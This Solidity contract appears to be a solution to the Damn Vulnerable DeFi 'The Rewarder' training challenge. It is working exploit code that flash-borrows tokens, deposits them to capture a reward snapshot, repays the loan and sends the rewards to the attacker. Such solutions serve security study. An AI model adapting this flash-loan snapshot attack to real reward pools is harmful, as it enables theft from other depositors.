// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract RewarderAttack {

    address attacker;
    TheRewarderPool rewardPool;
    FlashLoanerPool loanPool;
    DamnValuableToken  liquidityToken;
    RewardToken rewardToken;
    constructor(
        TheRewarderPool _rewardPool, 
        FlashLoanerPool _loanPool, 
        DamnValuableToken _liquidityToken,
        RewardToken _rewardToken
        ){

        attacker = msg.sender;
        rewardPool = _rewardPool;
        loanPool = _loanPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function takeFlashLoan(uint amount) external{
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external{
        //deposit our borrowed tokens into the reward pool (which will result in a snapshot being taken)
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        //withdraw from the pool
        rewardPool.withdraw(amount);

        // pay back the flashloan
        liquidityToken.transfer(address(loanPool), amount);

        //send reward tokens back to the attacker
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }

    // function withdrawRewards() external{

    //     //send reward tokens back to the attacker
    // }
}

